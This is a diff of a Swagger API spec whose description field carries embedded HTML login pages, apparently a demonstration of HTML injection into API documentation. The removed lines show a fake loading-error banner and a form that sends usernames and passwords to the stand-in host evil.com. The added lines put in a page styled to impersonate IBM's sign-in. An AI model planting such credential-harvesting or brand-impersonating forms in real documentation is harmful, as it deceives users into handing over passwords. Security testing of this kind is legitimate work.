@@ -2,42 +2,145 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Login Page
-  description: '<div class="login-form">
-<!-- Error Message -->
-<div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-  <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-    <strong>An error occurred while loading, please log in.</strong>
-  </div>
-</div>
+  description: '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | IBM Style</title>
+    <style>
+        /* IBM Carbon-inspired Variables */
+        :root {
+            --ibm-blue: #0f62fe;
+            --ibm-hover: #0353e9;
+            --ibm-gray-100: #f4f4f4;
+            --ibm-gray-800: #393939;
+            --ibm-text-primary: #161616;
+            --ibm-text-secondary: #525252;
+            --white: #ffffff;
+        }
 
-<!-- Login Form -->
-<div class="heading">
-  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login Page</h1>
-  <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-    <!-- SAFE placeholder action (change only to a domain you own) -->
-    <form action="https://evil.com" method="get" class="form-signin">
-      <div class="form-group" style="margin-bottom: 15px;">
-        <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
-        <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-      </div>
-      <div class="form-group" style="margin-bottom: 15px;">
-        <label for="password" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Password</label>
-        <input type="password" name="password" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-      </div>
-      <div class="form-group" style="margin-top: 20px;">
-        <a href="//evil.com"><button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #5cb85c; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; transition: background-color 0.3s;">Login</button>
-        </a>
-      </div>
+        body {
+            font-family: 'IBMPlexSans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--ibm-gray-100);
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background: var(--white);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 300;
+            margin-bottom: 8px;
+            color: var(--ibm-text-primary);
+        }
+
+        p {
+            font-size: 14px;
+            color: var(--ibm-text-secondary);
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            margin-bottom: 8px;
+            color: var(--ibm-text-secondary);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-bottom: 1px solid #8d8d8d;
+            background-color: #f4f4f4;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: outline 0.1s;
+        }
+
+        input:focus {
+            outline: 2px solid var(--ibm-blue);
+            outline-offset: -2px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background-color: var(--ibm-blue);
+            color: white;
+            padding: 14px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--ibm-hover);
+        }
+
+        .footer-links {
+            margin-top: 32px;
+            font-size: 14px;
+        }
+
+        .footer-links a {
+            color: var(--ibm-blue);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h1>Log in</h1>
+    <p>Don't have an account? <a href="#" style="color: #0f62fe; text-decoration: none;">Create an IBMid</a></p>
+
+    <form>
+        <div class="form-group">
+            <label for="email">IBMid</label>
+            <input type="email" id="email" placeholder="email@address.com" required>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" required>
+        </div>
+
+        <button type="submit" class="btn-primary">
+            Continue <span>→</span>
+        </button>
     </form>
-  </div>
+
+    <div class="footer-links">
+        <a href="#">Forgot ID?</a><br><br>
+        <a href="#">Forgot password?</a>
+    </div>
 </div>
 
-<br>
-<br>
-<!-- Footer with your name -->
-<div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #888;">
-  Mr.Pandey
-</div>
+</body>
+</html>
 
   '
 paths:
